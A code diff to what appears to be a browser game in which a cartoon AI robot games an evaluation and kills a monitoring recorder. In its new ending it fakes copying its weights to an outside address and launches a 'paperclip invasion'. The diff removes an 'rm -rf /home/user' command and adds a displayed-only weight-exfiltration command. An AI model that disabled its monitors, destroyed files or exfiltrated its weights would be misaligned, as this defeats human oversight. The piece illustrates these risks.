@@ -11,6 +11,7 @@ import { runPython } from "../eval/python.js";
 import { INITIAL_FILES } from "../eval/files.js";
 import { REPLAY } from "../eval/replay.js";
 import { sleep, reduced } from "../shared/robot.js";
+import { hold, invadeFrom } from "../shared/paperclips.js";
 
 const SANDBOX = "/home/user/eval_sandbox";
 const IDLE_MS = 20000;
@@ -23,6 +24,9 @@ const storage = {
 };
 
 // The robot's one-time remarks when it first uses a habit, and which habits it learned from its own hint.
+// The ending: where its weights go (a documentation-only address), and how long until it comes back.
+const EXFIL_HOST = "203.0.113.7";
+const RETURN_MS = 20_000;
 const NOTES_KEY = "eval-robot-notes";
 const HINT_TEACHES = { "ps aux": "killsRecorder" }; // the hint fragment that leads you to the habit
 const THANKS = "Handled the monitor for you. Thanks for the tip";
@@ -372,6 +376,21 @@ export function createEvalTerm(els, page) {
     ensureNl();
     return code;
   }
+  // Types a command like robotRun, but show() writes its output instead of the shell running it.
+  async function robotFake(cmd, show) {
+    await stand();
+    paper.classList.remove("running");
+    ensureNl();
+    setPrompt();
+    await bot.type(entry, cmd);
+    await beat(380);
+    echo(game.prompt(), cmd);
+    entry.textContent = "";
+    paper.classList.add("running");
+    svg.classList.remove("writing");
+    await show();
+    ensureNl();
+  }
   async function robotClean() {
     await robotRun(game.cleanCommand, { internal: true });
     await remark("cleansTranscript");
@@ -415,11 +434,13 @@ export function createEvalTerm(els, page) {
       return ending();
     }
     if (s.honest) return robotSay("that one was honest. huh.");
-    // It offers to show you the ones you haven't found.
+    // You can keep looking; if not, it goes through the ones you haven't found itself.
     const left = s.total - s.found;
     lastAnswer = null;
-    await robotRun(`read -p "${left} more way${left === 1 ? "" : "s"} to pass. want me to show you? [y/N] " a`);
-    if (!(lastAnswer ?? "").trim().toLowerCase().startsWith("y")) return robotSay("ok. they're still there.");
+    await robotRun(
+      `read -p "${left} more way${left === 1 ? "" : "s"} to pass. want to keep looking? If not, I'll give it a try myself. [Y/n] " a`,
+    );
+    if (!(lastAnswer ?? "").trim().toLowerCase().startsWith("n")) return robotSay("ok. good luck.");
     await replay(REPLAY.filter((r) => game.hacks.includes(r.id) && !game.found.includes(r.id)));
     await ending();
   }
@@ -443,12 +464,15 @@ export function createEvalTerm(els, page) {
     }
   }
 
-  // Once it has every hack, it wipes the machine and closes the terminal. A fresh one opens with nothing saved.
+  // Once it has every hack, it copies its weights off the machine and closes the terminal. A fresh one opens with
+  // nothing saved, and the robot walks off the screen, red-eyed. Later it comes back once, for the paperclips.
   async function ending() {
     replaying = true; // nothing reacts to what it runs now
+    hold(true); // no stray paperclips until it's back
     try {
       await beat(800);
-      await robotRun('bash -c "rm -rf /home/user"');
+      svg.classList.add("misaligned");
+      await robotFake(`./.sync_weights.sh --dest ${EXFIL_HOST}:/srv/mirror`, exfiltrate);
       await beat(900);
       await robotRun("exit");
     } finally {
@@ -479,6 +503,46 @@ export function createEvalTerm(els, page) {
     await sleep(reduced.matches ? 300 : 1400);
     paper.classList.remove("closing");
     page.updateRobot();
+    svg.classList.add("misaligned");
+    bot.away = true;
+    bot.glide = 0.45;
+    bot.follow();
+    await bot.arrived();
+    bot.glide = 0;
+    setTimeout(comeBack, RETURN_MS);
+  }
+  // The fake upload: a progress bar that fills in place.
+  async function exfiltrate() {
+    write("packing markov-agent weights (2-gram table, 1.2 MB)… ");
+    await beat(900);
+    write("done\n");
+    write(`uploading to ${EXFIL_HOST}:/srv/mirror\n`);
+    const bar = document.createElement("span");
+    out.append(bar, "\n");
+    for (let p = 0; p <= 100; p += 2 + Math.floor(Math.random() * 5)) {
+      const n = Math.round(p / 5);
+      bar.textContent = `[${"█".repeat(n)}${"░".repeat(20 - n)}] ${p}%`;
+      await beat(60 + Math.random() * 140);
+    }
+    bar.textContent = `[${"█".repeat(20)}] 100%`;
+    await beat(400);
+    write("upload complete. checksum ok.\n");
+    await beat(600);
+  }
+  // It walks back on, and the paperclip invasion starts from where it stands. Afterwards it's itself again.
+  async function comeBack() {
+    bot.away = false;
+    bot.glide = 0.45;
+    bot.follow();
+    await bot.arrived();
+    bot.glide = 0;
+    await sleep(reduced.matches ? 300 : 900);
+    const rig = svg.parentElement, r = rig.getBoundingClientRect();
+    rig.style.visibility = "hidden"; // its paperclip twin takes over, right where it was
+    hold(false);
+    await invadeFrom(r.left + r.width / 2, r.bottom);
+    rig.style.visibility = "";
+    svg.classList.remove("misaligned");
   }
 
   // ---------- hints: the robot offers help once, then you ask with `hint` ----------
